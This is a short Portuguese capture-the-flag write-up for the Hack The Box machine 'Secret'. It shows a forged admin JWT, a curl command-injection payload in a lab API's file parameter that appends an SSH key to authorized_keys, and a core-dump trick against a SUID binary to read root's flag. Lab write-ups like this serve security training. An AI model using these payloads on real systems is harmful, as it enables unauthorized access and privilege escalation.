#  Secret

1. Criar usuario via API /api/user/register
2. Obter o JWT /api/user/login
3. Baixar *source code* e encontrar falhas de *command injection* no /api/logs
4. Encontrar TOKEN_SECRET que cria o JWT
5. Criar JWT com usuario *theadmin*
6. Adicionar chave ssh em authorized_keys do user
7. Explorar aplicação com *SUID* por *core dump*
8. Obter chave ssh

* [JWT Cracker](https://github.com/lmammino/jwt-cracker)
* [JWT.io](https://jwt.io
* [drt.sh htb-secret](https://drt.sh/posts/htb-secret/)


````shell
# Add ssh-key in authorized_keys
curl \
  -i \ # print headers
  -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkwMDg3YWYwM2VjMDA0NWVlNjg1M2YiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY4Mjk2NDh9.ENKbUxgLeuUXueEMn5DG_2LZUJemd11E842rQ1ekzLg' \ 
  -G \ # send data values through GET instead of POST
  --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" \ # encode data parameters
  'http://10.10.11.120/api/logs'
````

````shell
#Explore SUID elf with core dump
./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
ps
    PID TTY          TIME CMD
   2213 pts/4    00:00:00 bash
   2373 pts/4    00:00:00 count
   2374 pts/4    00:00:00 ps

kill -SIGSEGV 2373 #or kill -BUS pid
fg
./count
Bus error (core dumped)

$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report
$ strings /tmp/crash-report/CoreDump
````
